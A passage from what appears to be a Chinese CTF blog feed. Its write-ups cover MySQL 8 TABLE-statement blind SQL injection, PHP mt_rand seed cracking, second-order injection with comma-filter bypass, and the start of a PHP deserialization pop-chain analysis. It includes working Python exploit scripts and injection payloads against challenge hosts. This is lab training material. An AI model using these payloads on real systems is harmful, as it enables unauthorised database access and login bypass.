sys.stdout.write(&quot;[-]&#123;0&#125; Result : -&gt; &#123;1&#125; &lt;-\r&quot;.format(threading.current_thread().name,ret))</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">                break</span><br><span class="line">    print(threading.current_thread().name+&quot;[+]Result : -&gt;&quot;+ret+&quot;&lt;-&quot;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">blindequ(1,20)</span><br></pre></td></tr></table></figure><p>爆数据表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import binascii</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">url = &quot;http://182.116.62.85:26571/login.php&quot;</span><br><span class="line">def trans(a):</span><br><span class="line">    a = binascii.b2a_hex(a.encode(&#x27;utf-8&#x27;))</span><br><span class="line">    return &#x27;0x&#x27;+str(a,&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(1,500): </span><br><span class="line">    hexstr = &#x27;&#x27;</span><br><span class="line">    for char in range(32, 126):</span><br><span class="line">        hexstr = trans(flag+ chr(char))</span><br><span class="line">        #fl11aag</span><br><span class="line">        payload = &quot;admin&#x27;/**/and/**/ROW(&#x27;ctf&#x27;,&#123;&#125;,1,2,3,4)&gt;(TABLE/**/mysql.innodb_table_stats/**/order/**/by/**/database_name/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        #payload = &quot;admin&#x27;/**/and/**/(&#123;&#125;)=&gt;binary(TABLE/**/ctf.fl11aag/**/limit/**/1,1)#&quot;.format(hexstr)</span><br><span class="line">        datas = &#123;&quot;username&quot;:payload,&quot;password&quot;:&quot;admin&quot;&#125;</span><br><span class="line">        r = req.post(url,data=datas)</span><br><span class="line">        if(&quot;login success&quot; in r.text):</span><br><span class="line">            flag = flag + chr(char-1)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>最后读取flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://139.129.98.9:30003/login.php&#x27;</span><br><span class="line">payload = &#x27;admin\&#x27;and/**/substr((table/**/f11114g/**/limit/**/1,1),&#123;&#125;,1)=\&#x27;&#123;&#125;\&#x27;#&#x27;</span><br><span class="line">passa=&#x27;123&#x27;</span><br><span class="line">result = &#x27;&#x27;</span><br><span class="line">for j in range(1,500):</span><br><span class="line">    for i in &#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;:</span><br><span class="line">        py = payload.format(j,i)</span><br><span class="line">        post_data = &#123;&#x27;username&#x27;: py,&#x27;password&#x27;:passa&#125;</span><br><span class="line">        re = requests.post(url, data=post_data)</span><br><span class="line">        if &#x27;password&#x27; in re.text:</span><br><span class="line">            result += i</span><br><span class="line">            print(result)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>参考文章：[<a href="https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]">https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&amp;mid=2247483781&amp;idx=1&amp;sn=1cdb501787ea1c4bdbbe269b055f264c&amp;chksm=c01a86b3f76d0fa579033988aa71990448ff48e27e3def9feac994b81d9b1e3e7f6740188533&amp;mpshare=1&amp;scene=23&amp;srcid=1014L5fi7dWAaVU0EiVOulsW&amp;sharer_sharetime=1634199160117&amp;sharer_shareid=2cd15dd5abca7cee0fa30d6c72437d05#rd]</a></p><pre><code>[https://www.crisprx.top/archives/203][https://zhuanlan.zhihu.com/p/116632771]</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;table语句&quot;&gt;&lt;a href=&quot;#table语句&quot; class=&quot;headerlink&quot; title=&quot;table语句&quot;&gt;&lt;/a&gt;table语句&lt;/h1&gt;&lt;p&gt;mysql8版本上线了新的特性，就是table语句和VALUES语句&lt;/p&gt;
&lt;h2 id=&quot;tab</summary>
      
    
    
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>伪随机数以及文件泄露</title>
    <link href="http://example.com/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    <id>http://example.com/2021/10/14/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%BB%A5%E5%8F%8A%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</id>
    <published>2021-10-13T16:00:00.000Z</published>
    <updated>2021-10-14T08:17:38.675Z</updated>
    
    <content type="html"><![CDATA[<h1 id="伪随机数以及文件泄露"><a href="#伪随机数以及文件泄露" class="headerlink" title="伪随机数以及文件泄露"></a>伪随机数以及文件泄露</h1><p>打开页面，发现没有什么提示信息，所以用dirsearch去扫描，发现有文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.zip</span><br></pre></td></tr></table></figure><p>打开源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">header(&#x27;Content-type:text/html; charset=utf-8&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_POST[&#x27;login&#x27;]))&#123;</span><br><span class="line">    $username = $_POST[&#x27;username&#x27;];</span><br><span class="line">    $password = $_POST[&#x27;password&#x27;];</span><br><span class="line">    $Private_key = $_POST[&#x27;Private_key&#x27;];</span><br><span class="line">    if (($username == &#x27;&#x27;) || ($password == &#x27;&#x27;) ||($Private_key == &#x27;&#x27;)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并3秒后返回登录界面</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    else if($Private_key != &#x27;*************&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">        header(&#x27;refresh:2; url=login.html&#x27;);</span><br><span class="line">        echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    else&#123;</span><br><span class="line">        if($Private_key === &#x27;************&#x27;)&#123;</span><br><span class="line">        $getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;.&#x27;;&#x27;; </span><br><span class="line">        $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">        mysql_select_db(&quot;test&quot;,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        while($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">// genarate public_key </span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span><br></pre></td></tr></table></figure><p>从源码中，我们发现一个登录界面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&#x27;refresh:2; url=login.html&#x27;);</span><br></pre></td></tr></table></figure><p>我们尝试构造/login.html，然后登录，发现它需要用户名，密码和私钥，而从源码中，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getuser = &quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span><br></pre></td></tr></table></figure><p>所以我们可以知道用户名为crispr，密码我们可以构造万能钥匙1’or ‘1=1绕过，而对于私钥，我们知道公钥是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$Public_key = KVQP0LdJKRaV3n9D</span><br></pre></td></tr></table></figure><p>所以我们可以使用爆破的方式获取种子，从而得到私钥</p><p>首先我们要获取爆破种子的参数值，exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s=&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span><br><span class="line">key=&#x27;KVQP0LdJKRaV3n9D&#x27;</span><br><span class="line">m=&#x27;&#x27;</span><br><span class="line">for i in key:</span><br><span class="line">    for j in range(len(s)):</span><br><span class="line">        if i==s[j]:</span><br><span class="line">            m+=&quot;&#123;&#125; &#123;&#125; 0 &#123;&#125; &quot;.format(j,j,len(s)-1)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>然后我们使用php_mt_seed来对种子进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1775196155</span><br></pre></td></tr></table></figure><p>然后我们就可以得到私钥，exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(1775196155);</span><br><span class="line">function public_key($length = 16) &#123;</span><br><span class="line">    $strings1 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $public_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);</span><br><span class="line">    return $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  //genarate private_key</span><br><span class="line">function private_key($length = 12) &#123;</span><br><span class="line">    $strings2 = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;;</span><br><span class="line">    $private_key = &#x27;&#x27;;</span><br><span class="line">    for ( $i = 0; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);</span><br><span class="line">    return $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">echo public_key() . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo private_key();</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到私钥为XuNhoueCDCGc，然后登录即可得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;伪随机数以及文件泄露&quot;&gt;&lt;a href=&quot;#伪随机数以及文件泄露&quot; class=&quot;headerlink&quot; title=&quot;伪随机数以及文件泄露&quot;&gt;&lt;/a&gt;伪随机数以及文件泄露&lt;/h1&gt;&lt;p&gt;打开页面，发现没有什么提示信息，所以用dirsearch去扫描，发现有文件泄</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>逗号的绕过以及二次注入</title>
    <link href="http://example.com/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2021/10/13/%E9%80%97%E5%8F%B7%E7%9A%84%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8A%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</id>
    <published>2021-10-12T16:00:00.000Z</published>
    <updated>2021-10-12T18:46:39.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逗号绕过以及二次注入"><a href="#逗号绕过以及二次注入" class="headerlink" title="逗号绕过以及二次注入"></a>逗号绕过以及二次注入</h1><p>我们打开页面，发现只有一个登录页面，尝试进行sql闭合测试，发现失败，所以用dirsearch扫描目录，发现有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">register.php、index.php以及login.php</span><br></pre></td></tr></table></figure><p>所以猜测可能是二次注入，即在register.php页面注册，写入sql语句，程序会将它写入存入数据库中，然后在login.php页面登录时会从数据库中刚刚写入的sql语句，并进行读取，然后回显，所以我们可以测试一下，在register.php页面构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username：0&#x27;and &#x27;1</span><br></pre></td></tr></table></figure><p>然后在login.php页面登录后，发现有回显0，所以证明是二次注入，然后经过测试，发现information_schema被过滤，而且逗号也被过滤，所以我们可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr(database() from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure><p>来绕过逗号，其中+在sql语言中是运算符，而from 1 for 1，意思是在字符串中的第一个位置取出一个字符出来，相当于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr(database(),1,1))</span><br></pre></td></tr></table></figure><p>而对于information_schema的过滤，我们可以猜测flag在flag表中，所以我们可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;+ascii(substr((select * from flag) from 1 for 1))+&#x27;0;</span><br></pre></td></tr></table></figure><p>来读取flag，所以exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import logging</span><br><span class="line">import re</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line"># LOG_FORMAT = &quot;%(lineno)d - %(asctime)s - %(levelname)s - %(message)s&quot;</span><br><span class="line"># logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)</span><br><span class="line"></span><br><span class="line">def search():</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    url = &#x27;http://b52b0533-2f84-4c9b-bd73-e912ab23a59f.node3.buuoj.cn/&#x27;</span><br><span class="line">    url1 = url+&#x27;register.php&#x27;</span><br><span class="line">    url2 = url+&#x27;login.php&#x27;</span><br><span class="line">    for i in range(100):</span><br><span class="line">        sleep(0.3)#不加sleep就429了QAQ</span><br><span class="line">        data1 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;username&quot; : &quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        data2 = &#123;&quot;email&quot; : &quot;1234&#123;&#125;@123.com&quot;.format(i), &quot;password&quot; : &quot;123&quot;&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;,r2.text)</span><br><span class="line">        res1 = re.search(r&#x27;\d+&#x27;, res.group())</span><br><span class="line">        flag = flag+chr(int(res1.group()))</span><br><span class="line">        print(flag)</span><br><span class="line">    print(&quot;final:&quot;+flag)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    search()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;逗号绕过以及二次注入&quot;&gt;&lt;a href=&quot;#逗号绕过以及二次注入&quot; class=&quot;headerlink&quot; title=&quot;逗号绕过以及二次注入&quot;&gt;&lt;/a&gt;逗号绕过以及二次注入&lt;/h1&gt;&lt;p&gt;我们打开页面，发现只有一个登录页面，尝试进行sql闭合测试，发现失败，所以用</summary>
      
    
    
    
    
    <category term="sql注入" scheme="http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>pop链3之__get()和__call()魔术方法的使用</title>
    <link href="http://example.com/2021/10/13/pop%E9%93%BE3%E4%B9%8B__get()%E5%92%8C__call()%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2021/10/13/pop%E9%93%BE3%E4%B9%8B__get()%E5%92%8C__call()%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2021-10-12T16:00:00.000Z</published>
    <updated>2021-10-13T13:06:36.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pop链3之-get-和-call-魔术方法的使用"><a href="#pop链3之-get-和-call-魔术方法的使用" class="headerlink" title="pop链3之__get()和__call()魔术方法的使用"></a>pop链3之__get()和__call()魔术方法的使用</h1><p>魔术方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__get()：当对象调用不可访问的属性时被调用</span><br><span class="line"></span><br><span class="line">__call()：当对象调用不可访问的函数时被调用</span><br></pre></td></tr></table></figure><p>我们打开页面，发现是注册和登录页面，所以我们在注册和登录时，随便尝试了sql注入闭合测试和二次注入，而对于二次注入的测试，可以注册时构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=0&#x27;and&#x27;1</span><br></pre></td></tr></table></figure><p>然后在登陆时，使用这个username，发现回显页面仍然是0’and’1，所以不存在二次注入，也不存在sql注入，所以此时我们可以使用dirsearch扫描目录，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.tar.gz</span><br></pre></td></tr></table></figure><p>文件泄露，所以我们下载<a href="http://www.tar.gz文件后,解压,然后审计源码,我们可以先从控制前端输入值的代码开始审计起,即在/">www.tar.gz文件后，解压，然后审计源码，我们可以先从控制前端输入值的代码开始审计起，即在</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/application/web/controller</span><br></pre></td></tr></table></figure><p>目录下的文件，我们可以查看Profile.php文件中对于上传文件处理的那一串代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public function upload_img()&#123;</span><br><span class="line">    if($this-&gt;checker)&#123;</span><br><span class="line">        if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">            $this-&gt;redirect($curr_url,302);</span><br><span class="line">            exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!empty($_FILES))&#123;</span><br><span class="line">        $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">        $this-&gt;ext_check();</span><br><span class="line">    &#125;</span><br><span class="line">    if($this-&gt;ext) &#123;</span><br><span class="line">        if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">            @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">            @unlink($this-&gt;filename_tmp);</span><br><span class="line">            $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">            $this-&gt;update_img();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;error(&#x27;Forbidden type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $this-&gt;error(&#x27;Unknow file type!&#x27;, url(&#x27;../index&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从这串代码中，我们可知</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;checker)&#123;</span><br><span class="line">    if(!$this-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">        $curr_url=&quot;http://&quot;.$_SERVER[&#x27;HTTP_HOST&#x27;].$_SERVER[&#x27;SCRIPT_NAME&#x27;].&quot;/index&quot;;</span><br><span class="line">        $this-&gt;redirect($curr_url,302);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当我们上传文件时，会先检查登录的账号和密码，是否正确，如果正确，才会进行下一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES))&#123;</span><br><span class="line">    $this-&gt;filename_tmp=$_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $this-&gt;filename=md5($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]).&quot;.png&quot;;</span><br><span class="line">    $this-&gt;ext_check();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时会将上传的文件名存储在$this-&gt;filename_tmp变量中，然后再对上传文件名进行md5加密，并加上.png后缀，然后存储在$this-&gt;filename中，然后进行一步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;ext) &#123;</span><br><span class="line">    if(getimagesize($this-&gt;filename_tmp)) &#123;</span><br><span class="line">        @copy($this-&gt;filename_tmp, $this-&gt;filename);</span><br><span class="line">        @unlink($this-&gt;filename_tmp);</span><br><span class="line">        $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;</span><br><span class="line">        $this-&gt;update_img();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果此时$this-&gt;filename中的文件后缀为png的话，则会判断$this-&gt;filename_tmp的尺寸，然后将$this-&gt;filename覆盖到$this-&gt;filename_tmp中，并删除$this-&gt;filename_tmp的变量的值，并将此文件存储在/upload/$this-&gt;upload_menu/$this-&gt;filename中</p><p>但是我们在login.php文件中的login_check会将cookie中的user参数的值进行base64解密，并反序列化</p><p>而这道题的过滤点在于，它会将上传的任何文件都变为.png后缀，所以我们可以想办法利用profile.php文件中的upload_img()函数中的copy函数对原来上传的文件名(加后缀)进行覆盖，并将原来文件的内容复制到覆盖后的文件中，从而绕过.png后缀这个过滤点，因此我们需要构造一条pop来链</p><p>我们看向profile.php文件中的两个魔术方法，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function __get($name)</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;except[$name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function __call($name, $arguments)</span><br><span class="line">&#123;</span><br><span class="line">    